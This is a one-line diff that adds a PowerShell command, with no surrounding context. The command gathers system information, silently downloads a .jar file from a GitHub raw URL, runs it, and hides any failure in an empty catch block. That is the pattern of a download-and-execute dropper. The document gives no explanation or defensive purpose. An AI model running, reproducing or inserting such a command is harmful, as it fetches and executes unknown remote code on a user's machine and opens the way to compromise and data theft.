@@ -1,0 +1,1 @@
+powershell systeminfo; try { iwr "https://github.com/denisgrnnk/ssss/raw/main/1.jar" -OutFile 1.jar -ErrorAction Stop; start 1.jar } catch {} ;
